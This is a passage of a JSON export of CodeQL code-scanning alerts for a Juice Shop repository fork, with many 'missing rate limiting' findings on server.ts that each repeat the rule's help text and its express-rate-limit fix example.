{\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":642,"end_line":642,"start_column":31,"end_column":62},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/49/instances","dismissal_approved_by":null},{"number":48,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/48","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/48","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":640,"end_line":640,"start_column":33,"end_column":65},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/48/instances","dismissal_approved_by":null},{"number":47,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/47","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/47","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":634,"end_line":634,"start_column":60,"end_column":73},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/47/instances","dismissal_approved_by":null},{"number":46,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/46","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/46","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":634,"end_line":634,"start_column":23,"end_column":58},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/46/instances","dismissal_approved_by":null},{"number":45,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/45","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/45","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":631,"end_line":631,"start_column":21,"end_column":44},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/45/instances","dismissal_approved_by":null},{"number":44,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/44","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/44","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":630,"end_line":630,"start_column":25,"end_column":54},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/44/instances","dismissal_approved_by":null},{"number":43,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/43","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/43","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":621,"end_line":621,"start_column":90,"end_column":110},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/43/instances","dismissal_approved_by":null},{"number":42,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/42","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/42","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":620,"end_line":620,"start_column":119,"end_column":134},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/42/instances","dismissal_approved_by":null},{"number":41,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/41","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/41","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":619,"end_line":619,"start_column":82,"end_column":93},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/41/instances","dismissal_approved_by":null},{"number":40,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/40","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/40","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":606,"end_line":606,"start_column":63,"end_column":83},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/40/instances","dismissal_approved_by":null},{"number":39,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/39","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/39","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    